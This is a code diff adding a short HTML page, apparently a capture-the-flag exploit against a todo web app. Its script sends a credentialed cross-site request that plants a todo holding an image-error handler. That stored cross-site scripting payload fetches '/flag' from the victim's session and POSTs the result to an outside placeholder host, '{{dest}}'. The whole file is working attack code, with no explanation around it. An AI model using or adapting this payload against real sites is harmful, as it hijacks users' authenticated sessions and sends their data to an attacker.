@@ -1,0 +1,13 @@
+<div id='s2'>
+const dest='{{dest}}';
+fetch('/flag').then(r => r.text()).then(b => fetch(dest, {method: 'POST', body: b}));
+</div>
+<script>
+const ep='{{ep}}';
+const s2=document.getElementById('s2').innerHTML;
+const fd=new FormData();
+fd.set('todo', '<img src="x" onerror="'+s2+'">');
+fetch(ep+'/api/todos',
+    {method: 'POST', body: fd, mode: 'no-cors', credentials: 'include'}).then(
+        _ => {document.location.href = ep + '/todos'});
+</script>
